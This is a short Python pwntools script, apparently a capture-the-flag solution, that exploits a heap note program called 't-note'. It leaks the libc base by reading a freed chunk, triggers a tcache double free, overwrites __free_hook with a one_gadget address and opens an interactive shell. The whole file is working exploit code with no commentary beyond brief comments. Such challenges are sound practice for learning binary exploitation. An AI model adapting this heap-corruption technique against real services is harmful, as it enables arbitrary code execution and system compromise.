from pwn import *

def add(size, data):
    r.sendafter(">", b'1')
    r.sendafter("Size: ", str(size))
    r.sendafter("Note: ", data)

def show(index):
    r.sendafter(">", b'2')
    r.sendafter("Index: ", str(index))

def dels(index):
    r.sendafter(">", b'3')
    r.sendafter("Index: ", str(index))

r = process("./t-note")

add(0x500, b'A')
add(0x60, b'A')

# Leak libc base
dels(0)
show(0)
r.recvline()
libc_base = u64(r.recv(6) + b'\0\0') - 0x3ebca0
success("Libc -> %s" % hex(libc_base))

# Double free
dels(1)
dels(1)

add(0x60, p64(libc_base+0x3ed8e8)) # free_hook
add(0x60, b'A')
add(0x60, p64(libc_base+0x4f322)) # one_gadget

r.interactive()
